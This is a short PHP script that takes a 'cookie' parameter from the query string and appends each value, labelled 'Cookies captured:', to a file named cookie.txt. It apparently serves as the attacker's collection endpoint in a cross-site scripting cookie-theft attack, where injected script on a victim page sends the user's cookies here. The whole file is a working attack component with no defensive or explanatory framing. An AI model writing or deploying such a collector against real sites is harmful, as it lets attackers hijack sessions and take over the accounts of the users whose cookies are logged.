<?php
if($_GET["cookie"]){
  if(!file_exists("cookie.txt")){
    file_put_contents("cookie.txt", "Cookies captured:". $_GET["cookie"]."\n");
  }else{
    file_put_contents("cookie.txt", "Cookies captured:". $_GET["cookie"]."\n", FILE_APPEND);
  }
}
?>